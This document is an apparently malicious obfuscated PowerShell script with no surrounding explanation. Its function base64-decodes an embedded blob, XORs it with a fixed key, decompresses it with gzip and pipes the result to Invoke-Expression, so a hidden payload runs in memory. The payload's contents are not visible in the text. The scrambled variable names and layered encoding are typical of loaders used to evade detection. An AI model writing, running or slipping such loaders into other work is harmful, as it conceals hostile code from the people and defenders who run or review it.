$rtmujczs342gv1i = [System.Text.Encoding]::ascii
function iw09anku7v234ts5zhj1gcerxlo  {param($e2yj0d35p7u4r69 )
  $3y4a0pb5h8c9emi = [System.Convert]::FromBase64String($e2yj0d35p7u4r69)
  $mfizsex2n9lbro3= $rtmujczs342gv1i.GetBytes("bdq93l781yig")
    $f2cv1s87yr3nhw0 = $3y4a0pb5h8c9emi
    $01bu52afdeot3mn = $(for ($gz68m2bijndv4wp = 0; $gz68m2bijndv4wp -lt $f2cv1s87yr3nhw0.length; ) {
        for ($9avulfhpxsgt4d8 = 0; $9avulfhpxsgt4d8 -lt $mfizsex2n9lbro3.length; $9avulfhpxsgt4d8++) {
            $f2cv1s87yr3nhw0[$gz68m2bijndv4wp] -bxor $mfizsex2n9lbro3[$9avulfhpxsgt4d8]
            $gz68m2bijndv4wp++
            if ($gz68m2bijndv4wp -ge $f2cv1s87yr3nhw0.Length) {
                $9avulfhpxsgt4d8 = $mfizsex2n9lbro3.length
            }
        }
    })
	$e74l932mid8b10c = New-Object System.IO.MemoryStream( , $01bu52afdeot3mn )

	    $0478qsmt9uazox6 = New-Object System.IO.MemoryStream
        $a1z0xwi9f7c6ybs = New-Object System.IO.Compression.GzipStream $e74l932mid8b10c, ([IO.Compression.CompressionMode]::Decompress)
	    $a1z0xwi9f7c6ybs.CopyTo( $0478qsmt9uazox6 )
        $a1z0xwi9f7c6ybs.Close()
		$e74l932mid8b10c.Close()
		[byte[]] $14x39apiur0gnkf = $0478qsmt9uazox6.ToArray()
 $3pf0v17mq5koxcb=$14x39apiur0gnkf
    return $3pf0v17mq5koxcb
}
[byte[]]$hqgd3kui5v4zfjn=iw09anku7v234ts5zhj1gcerxlo $3t054mzrfybhqcx
[System.Text.Encoding]::ascii.GetString((iw09anku7v234ts5zhj1gcerxlo "fe95OTNsNzg1eeQyuRbSASMRaZLJfvztz4SEedInBXZjANlaRpUdpfqpgguK573zbmaVuVPoxx1ohpJTdUN/p7QsIphnkp2OsUnQExmwaf4ssAvpMPMICqXVLnr+0+uHKOxRqJ0Z4WVTXNqkwoNt6rsRd2J1HHnc77Y6crrzMgZwHgEd3SpUtP9lanHinyeLUIpOpa/841n9xckV0vJF7EKka/c+H/WFJCpQflJy5RNtHbn4atfF3p3vMlZlHeM3V06eMEpDMmDF1LZXhG9bHUvwvAAr6f15F0/mA0nPfUiCnMEeDwOgc0hz4Jry+sySnOiGmRgsEQoOWTRnsBBeLxPtyEzl8rNUVIOfm4ggV/4LPBIxQfAKVf/8RWc33sHmFEBaaLylFTOMWTDC3IjLhDnZWRVh0gPZwrHMo/5bz4fiHDOAmeT94DnkW/mWDLngeAQcRICVQYZZ71QqHt7e8Gb98ibSW6HZStGV5p21izaatiS230uXpFnSgBOGMsMZuhl7EwCtaHhkHMrZv8tSp3l+sZLDJSeLvEH9k1vuR+8KqvhW7X02g13BDa5Yu5rf4/45fuXG7PL2/pSKmsxpRredyDC5Yx7nciO5IfV1oJDkPwmYcVk+pLPkMNX23+htd1BeGAEsUGCSBRgl8KBUq09D1Ftk8Hc6ZJFepc1Ey6WhKEde64yo+AHkZEHhRVmO6HrZs5M9i5g3emw2Y1PA/gSzyAqizTxLb/31ATa6AXoi4iZLo52Fa/MuFH91I5m0FV/+IAgwQ6eNQMa9o/i1rM0syiZD/SomYH0V5ddV1wQxP69YRqiZJzVegc11gLep10plTu9GCsAX1wIrtG00P3o/LfXzTKsyJejP+SJ4ErqXUH22XgNQdLh1S5IbqrOLHUiA+TJ28GZ4OHVe61tAeC51vI1vq5XnSEEBOjO8mUyUOgirB8r9nN3xQZYEf/awWITDWptjOsTLSqn45UdPV2q6z+7PDViP/PuGfuW55YGJjZaaVNjEpKiV1IDeIj6Rv8lEg3jTasL6xoTeHwl+lUIT3kyefspsnh7vknl+GJF5enPh6rfUCDE2ABp/mT05DU/xSP1vafCJfw9vuc/1MBOG53MZlSIWEhocAlJLpMRj7Hg4puulwSndRs1SsKyqRnF0kTqPJzK1x1u5C5txNz2EaX0tcyNDdtRexR9u7xM3hJ3cMoH3EgVLHE/VEACdZ7Dt8cozMDgx"))|iex;